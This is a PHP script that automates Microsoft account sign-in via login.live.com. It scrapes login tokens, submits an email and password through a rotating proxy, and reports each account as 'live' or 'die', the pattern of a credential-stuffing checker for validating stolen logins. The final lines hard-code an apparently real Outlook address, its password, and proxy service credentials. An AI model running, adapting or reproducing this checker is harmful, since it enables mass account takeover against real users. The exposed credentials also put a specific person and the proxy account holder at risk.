<?php
function check_web_flow($email, $password, $proxy = '') {
    $client_id = '9199bf20-a13f-4107-85dc-02114787ef48';
    $scope = 'https://outlook.office.com/.default openid profile offline_access';
    $nonce = md5(uniqid(rand(), true));
    $state = md5(uniqid(rand(), true));
    $code_challenge = rtrim(strtr(base64_encode(hash('sha256', 'QhEDql-zfEL8DxfKFgoS35SuOwdRTq9dhzFVGO8r8Zw', true)), '+/', '-_'), '=');
    
    $url = "https://login.live.com/oauth20_authorize.srf?client_id=$client_id&scope=" . urlencode($scope) . "&response_type=code&redirect_uri=https://login.live.com/oauth20_desktop.srf&nonce=$nonce&state=$state&code_challenge=$code_challenge&code_challenge_method=S256";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    }
    
    $res = curl_exec($ch);
    preg_match('/name="PPFT" id="(.*?)" value="(.*?)"/', $res, $ppft);
    preg_match('/urlPost:\'([^\']+)\'/', $res, $urlPost);
    
    if(!isset($ppft[2]) || !isset($urlPost[1])){
        return ['status' => 'die', 'reason' => 'Failed to parse login page'];
    }
    
    $PPFT = $ppft[2];
    $postUrl = $urlPost[1];
    
    $postData = http_build_query([
        'login' => $email,
        'loginfmt' => $email,
        'passwd' => $password,
        'PPFT' => $PPFT
    ]);
    
    curl_setopt($ch, CURLOPT_URL, $postUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    
    $res2 = curl_exec($ch);
    $url2 = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close($ch);
    
    if (strpos($url2, 'code=') !== false) {
        return ['status' => 'live'];
    } elseif (strpos($res2, 'incorrect') !== false || strpos($res2, 'incorreta') !== false) {
        if (strpos($res2, 'várias vezes') !== false || strpos($res2, 'too many times') !== false) {
            return ['status' => 'die', 'reason' => 'Rate Limited'];
        }
        return ['status' => 'die', 'reason' => 'Wrong Password'];
    } else {
        return ['status' => 'die', 'reason' => 'App Blocked (Modern Auth)'];
    }
}

$proxy = 'http://1e8bbc1522820a8c71e0:9725f57c6811ab27@gw.dataimpulse.com:823';
$res = check_web_flow('marciorubens065@outlook.com', '89317578Ma#', $proxy);
print_r($res);
?>
